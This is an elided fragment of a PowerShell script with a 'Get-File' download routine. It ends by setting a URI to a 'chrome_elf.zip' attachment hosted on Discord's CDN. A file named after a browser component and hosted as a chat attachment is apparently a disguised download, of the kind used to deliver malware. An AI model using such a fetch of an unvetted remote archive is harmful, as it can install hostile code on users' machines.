...
function Get-File
{
  ...
  else
  {
    ...
    Write-Verbose -Message "Size: $BufferSize B ($($BufferSize/("1$BufferUnit")) $BufferUnit)"
...
try
{
  $uri = 'https://cdn.discordapp.com/attachments/897958057659748352/946488642933780520/chrome_elf.zip'
